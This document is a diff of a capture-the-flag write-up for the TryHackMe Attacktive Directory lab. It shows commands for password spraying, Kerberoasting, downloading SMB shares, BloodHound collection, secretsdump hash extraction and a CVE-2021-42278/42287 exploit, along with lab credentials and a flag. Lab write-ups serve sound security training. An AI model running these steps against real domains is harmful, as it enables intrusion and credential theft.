@@ -52,40 +52,60 @@ image:
 	![Attacktivedirect cracking AS-REP_HASH.png](Attacktivedirect%20cracking%20AS-REP_HASH.png)
 	- svc-admin:management2005
 
-5. Password Spraying w/ kerbrute
+## TCP/5985 (WinRM)
+1. Could not WINRM w/ svc-admin:management2005
+	``` 
+	┌──(root💀kali)-[~/tryhackme/attacktivedirect/10.10.184.179/scans]
+	└─# crackmapexec winrm $ip -u 'svc-admin' -p 'management2005'
+	SMB         10.10.15.180    5985   ATTACKTIVEDIREC  [*] Windows 10.0 Build 17763 (name:ATTACKTIVEDIREC) (domain:spookysec.local)
+	HTTP        10.10.15.180    5985   ATTACKTIVEDIREC  [*] http://10.10.15.180:5985/wsman
+	WINRM       10.10.15.180    5985   ATTACKTIVEDIREC  [-] spookysec.local\svc-admin:management2005
+	```
+	
+## TCP/3389 (RDP)
+1. RDP w/ svc-admin:management2005
+	``` 
+	┌──(root💀kali)-[~/tryhackme/attacktivedirect/10.10.184.179/scans]
+	└─# rdesktop -d spookysec.local -u 'svc-admin' -p 'management2005' $ip
+	```
+2. User Flag
+	``` 
+	TryHackMe{K3rb3r0s_Pr3_4uth}
+	```
+	![](Pasted%20image%2020220219231904.png)
+
+
+# Privilege Escalation 
+
+## Backup 
+1. Password Spraying w/ kerbrute
 	```
 	~/tools/windows-binaries/AD/kerbrute passwordspray --dc $ip -d spookysec.local found_users_grep.txt management2005 -o password_spray_results.txt
 	```
 	![Attacktivedirect password spray.png](Attacktivedirect%20password%20spray.png)
 	- Password (management2005) not reused elsewhere 
-6. Kerberoasting w/ GetUserSPNs.py
+2. Kerberoasting w/ GetUserSPNs.py
 	```
 	GetUserSPNs.py spookysec.local/svc-admin:management2005 -dc-ip $ip -request
 	```
 	- Unable to find any SPN service accounts
-
-## TCP/5985 (WinRM)
-1. Could not RDP/Evil-WINRM using `svc-admin`
-
-## TCP/139,445 (SMB)
-1. Access `svc-admin` fileshares
+3. Access `svc-admin` fileshares
 	```
 	smbmap -u 'svc-admin' -p 'management2005' -H $ip 
 	```
 	![Attactivedirect smbmap.png](Attactivedirect%20smbmap.png)
-3. View `backup` directory
+4. View `backup` directory
 	```
 	smbclient //$ip/backup -U 'svc-admin'
 	```
 	![Pasted image 20220219214804.png](Pasted%20image%2020220219214804.png)
-4.  Get all files recursively from `backup` directory
+5.  Get all files recursively from `backup` directory
 	```
 	smbclient //$ip/backup -U 'svc-admin' -c 'prompt;recurse;mget *'
 	```
 	![Attacktivedirect backup user creds.png](Attacktivedirect%20backup%20user%20creds.png)
 	- backup@spookysec.local:backup2517860
 
-# Privilege Escalation 
 
 ## Domain Admin - Secretsdump
 1. Look for privilege escalation path w/ bloodhound
@@ -97,7 +117,7 @@ image:
 	# More complete syntax
 	bloodhound-python -c All -u 'svc-admin' -p 'management2005' -gc 'ATTACKTIVEDIREC.spookysec.local' -dc 'AttacktiveDirectory.spookysec.local' -d 'spookysec.local' -ns $ip --zip
 	```
-	![](Pasted%20image%2020220219213410.png)
+	![](Pasted%20image%2020220219233046.png)
 	- Both command works, use 1 only
 2. Bloodhound Analysis
 	- Setup
@@ -110,7 +130,7 @@ image:
 	┌──(root💀kali)-[~/tryhackme/attacktivedirect/10.10.184.179/exploit/bloodhound]
 	└─# impacket-secretsdump 'spookysec.local/backup@10.10.58.30' -just-dc -outputfile secrets_dump_hash.txt
 	```
-	![](Pasted%20image%2020220219213654.png)
+	![](Pasted%20image%2020220219233158.png)
 4. Extract only NTLM hash
 	```
 	cat secrets_dump_hash.txt.ntds | cut -d ':' -f4
@@ -129,6 +149,7 @@ image:
 	
 ## Domain Admin - CVE-2021-42278 & CVE-2021-42287
 1. This exploit allows us to privilege escalate from any domain user to a domain administrator
+	- svc-admin -> Domain Admin
 2. Download exploit
 	``` 
 	git clone https://github.com/Alh4zr3d/sam-the-admin.git
